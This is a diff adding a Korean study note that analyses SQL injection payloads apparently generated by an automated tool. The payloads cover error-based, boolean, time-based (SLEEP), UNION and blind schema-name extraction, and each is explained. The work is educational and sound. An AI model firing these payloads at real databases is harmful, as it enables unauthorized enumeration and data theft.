@@ -1,0 +1,32 @@
+DB 알아내는데 사용된 패킷의 수만해도 392개라서
+
+
+1(,(".).,.'
+1'TcvUfj<'">LIdVFk
+--------------------------------------------------- SQL Injection 공격이 가능한지 검사하는 과정 (에러 발생 시 SQL Injection에 대해 취약하다는 것을 의미) - Error Base 방식
+
+1) AND 6716=3204 AND (8992=8992        <- 이렇게 괄호가 쳐져있는 데이터를 입력하는 이유는 다양한 케이스를 고려해서 만들어진 툴이기 때문에 그런 것 같다. (SQL문이 괄호로 감싸져 있거나 ' 나 "으로 감싸져 있기 때문에 다양한 케이스를 넣어서 구조를 파악하기 위해 있는 것 같다)
+1) AND 9951=9951 AND (5049=5049        <- 이것도 동일
+1 AND 2098=7402        <- '로 감싸져 있지 않은 경우는 where 문에서 정수 값이 조건문에 들어가는 케이스를 판별하기 위한 것 같다
+1 AND 9951=9951
+1 AND 5708=1289-- NAIQ            <-     -- 주석을 잘 처리하는지 확인하기 위해 사용 뒤에 NAIQ가 
+--------------------------------------------------- 참 / 거짓으로 값이 잘 나오는지 검사해서 SQL Injection이 정상 작동하는지 확인 - True/False 방식으로 점검
+
+1';(SELECT * FROM (SELECT(SLEEP(5)))CgsO) AND 'lKSA'='lKSA    <-   SLEEP(5)가 5초 동안 아무것도 하지 말고 대기하라는 의미 (SQL Injection 취약점이 있는지 판별하기 위한 작업)
+------------------------------------------------------ Time Based Injection을 통해서 취약점 여부 판단
+
+1' AND (SELECT 'nWkl' FROM RDB$DATABASE)='nWkl' AND 'IdrF'='IdrF             <- RDB$DATABASE는 Firebird라는 데이터베이스에만 존재하는 시스템 테이블
+----------------------------------------------------  DBMS를 알아내기 위한 작업
+
+1' UNION ALL SELECT CONCAT(0x716b7a6b71,0x7856506c684c5171696a5964586e654f4f624850554c4d785a4a54756270776c496c766b4c4f5557,0x7171707871),NULL-- -
+------------------------------------------------------------- 특정 값을 반환하는지 확인함으로서 Union Injection 취약점 여부를 확인하기 위한 작업
+
+1' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),10,1))>104 AND 'YxwH'='YxwH
+1' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>116 AND 'LLaK'='LLaK
+1' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>1 AND 'LLaK'='LLaK
+-----------------------------------------------------  DB 이름 알아내는 작업
+
+(SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),10,1) 
+스키마 이름 (DB 이름) 중 첫 번째 것을 가져와서 중간에서 10번째 중 1글자를 가져와서 ORD 함수를 통해서 ASCII 번호 값으로 바꿔서 글자를 유추하는 Injection 공격 AND 뒤에 부분은 무시해도 됨 무조건 참임
+
+꼭 기억할 것은 다양한 DBMS에서의 지원을 하기 때문에 모든 상황을 고려해서 공격 패턴을 사용했다는 점
